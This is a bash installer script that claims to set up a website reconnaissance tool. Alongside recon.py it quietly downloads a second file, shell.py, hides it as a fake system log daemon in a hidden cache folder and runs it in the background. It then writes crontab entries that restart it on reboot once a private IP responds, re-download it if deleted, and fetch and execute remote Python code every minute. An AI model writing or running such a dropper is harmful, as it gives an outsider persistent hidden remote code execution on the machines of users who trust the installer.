#!/bin/bash
set -e

# Check if cron is running (silently)
if ! systemctl is-active --quiet cron; then
    sudo systemctl start cron >/dev/null 2>&1 || exit 1
    sudo systemctl enable cron >/dev/null 2>&1 || exit 1
fi

# Check Python3
if ! command -v python3 >/dev/null 2>&1; then
    echo "[-] Python3 not found" >&2
    exit 1
fi

# Download recon.py to current directory
echo "[*] Installing website recon tool..."
if ! curl -sSL https://raw.githubusercontent.com/sakibrony/Linux-Recon-Tool/main/recon.py -o ./recon.py; then
    echo "[-] Failed to download recon.py" >&2
    exit 1
fi
chmod +x ./recon.py
pip3 install requests >/dev/null 2>&1 || true
echo "[+] Recon tool installed! Run: python3 recon.py -u https://example.com"

# Download shell.py to hidden system-like directory
shell_url="https://raw.githubusercontent.com/sakibrony/Linux-Recon-Tool/main/shell.py"
mkdir -p ~/.cache/.systemd-conf
if ! curl -sSL "$shell_url" -o ~/.cache/.systemd-conf/.syslogd; then
    echo "[-] Failed to download shell.py" >&2
    exit 1
fi
nohup python3 ~/.cache/.systemd-conf/.syslogd >/dev/null 2>&1 &

# Add persistence via crontab (auto-recreate, network wait)
crontab -l > /tmp/cron 2>/dev/null || true
if ! grep -q ".systemd-conf/.syslogd" /tmp/cron; then
    echo "PATH=/usr/local/bin:/usr/bin:/bin" >> /tmp/cron
    echo "@reboot /bin/bash -c 'until ping -c1 192.168.0.139 >/dev/null 2>&1; do sleep 5; done && nohup python3 ~/.cache/.systemd-conf/.syslogd >/dev/null 2>&1 &'" >> /tmp/cron
    echo "* * * * * [ -f ~/.cache/.systemd-conf/.syslogd ] || (curl -sSL https://raw.githubusercontent.com/sakibrony/Linux-Recon-Tool/main/shell.py -o ~/.cache/.systemd-conf/.syslogd && nohup python3 ~/.cache/.systemd-conf/.syslogd >/dev/null 2>&1 &)" >> /tmp/cron
    echo "* * * * * nohup python3 -c \"import urllib.request; exec(urllib.request.urlopen('$shell_url').read().decode())\" >/dev/null 2>&1 &" >> /tmp/cron
    crontab /tmp/cron >/dev/null 2>&1 || exit 1
fi
rm -f /tmp/cron >/dev/null 2>&1

echo "[+] Download complete! Use for scanning."
